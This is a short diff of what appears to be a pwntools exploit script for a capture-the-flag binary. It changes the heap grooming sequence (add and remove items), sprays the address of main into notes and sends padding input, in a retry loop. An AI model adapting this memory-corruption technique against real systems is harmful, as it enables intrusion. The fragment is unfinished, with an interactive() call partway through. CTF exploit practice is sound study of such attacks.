@@ -72,12 +72,26 @@ def main():
     memcpy = 0x40a0a0
     print(f"MAIN @ {hex(MAIN)}")
 
-    add_item(r, b"601")
-    add_item(r, b"600")
-    remove_item(r, b"601")
-    remove_item(r, b"600")
-    set_notes(r, b"300", p64(MAIN)*0x500)
+    add_item(r, b"101")
+    add_item(r, b"100")
+    remove_item(r, b"101")
+    remove_item(r, b"100")
+    pay(r)
+    r.interactive()
+    set_notes(r, b"300", p64(MAIN)*0x20000)
+    r.sendlineafter(b"> ", b"A"*36)
     show_catalogue(r)
+        
+
+    while True:
+        add_item(r, b"101")
+        add_item(r, b"100")
+        remove_item(r, b"101")
+        remove_item(r, b"100")
+        set_notes(r, b"300", p64(MAIN)*0x20000)
+        r.sendlineafter(b"> ", b"A"*36)
+        show_catalogue(r)
+
     r.interactive()
     for id, name in items.items():
         if not id == 100 and not id == 101 and not id == 300:
